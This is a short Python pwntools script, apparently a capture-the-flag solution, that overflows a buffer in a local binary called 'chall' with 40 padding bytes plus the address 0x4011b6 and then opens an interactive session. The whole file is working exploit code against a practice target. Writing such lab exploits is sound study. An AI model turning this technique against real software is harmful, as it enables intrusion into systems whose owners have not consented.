#! /usr/bin/python3

from pwn import *

target = process('./chall')


print(target.recv())
target.sendline(b'A'*40 + p64(0x4011b6))
print("done")

#print(target.recvline())

target.interactive()